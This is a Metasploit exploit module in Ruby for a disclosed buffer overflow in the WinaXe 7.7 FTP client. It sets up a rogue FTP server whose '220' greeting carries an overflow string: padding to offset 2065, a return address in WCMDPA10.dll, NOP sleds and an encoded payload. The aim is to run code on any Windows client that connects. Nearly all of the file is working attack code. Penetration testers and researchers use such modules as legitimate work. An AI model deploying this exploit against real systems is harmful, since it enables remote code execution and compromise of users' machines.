##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::Remote::FtpServer

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'WinaXe 7.7 FTP Client Remote Buffer Overflow',
      'Description'    => %q{
          This module exploits a buffer overflow in the WinaXe 7.7 FTP client.
        This issue is triggered when a client connects to the server and is
        expecting the Server Ready response.
      },
      'Author' =>
        [
          'Chris Higgins',  # msf Module -- @ch1gg1ns
          'hyp3rlinx'        # Original discovery
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'EDB', '40693'],
          [ 'URL', 'http://hyp3rlinx.altervista.org/advisories/WINAXE-FTP-CLIENT-REMOTE-BUFFER-OVERFLOW.txt' ]
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread'
        },
      'Payload'        =>
        {
          'Space'    => 1000,
          'BadChars' => "\x00\x0a\x0d"
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Windows Universal',
            {
              'Offset' => 2065,
              'Ret' => 0x68017296 # push esp # ret 0x04 WCMDPA10.dll
            }
          ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Nov 03 2016',
      'DefaultTarget'  => 0))
  end

  def on_client_unknown_command(c, _cmd, _arg)
    c.put("200 OK\r\n")
  end

  def on_client_connect(c)
      print_status("Client connected...")

      sploit =  rand_text(target['Offset'])
      sploit << [target.ret].pack('V')
      sploit << make_nops(10)
      sploit << payload.encoded
      sploit << make_nops(20)

      c.put("220" + sploit + "\r\n")
      c.close
  end

end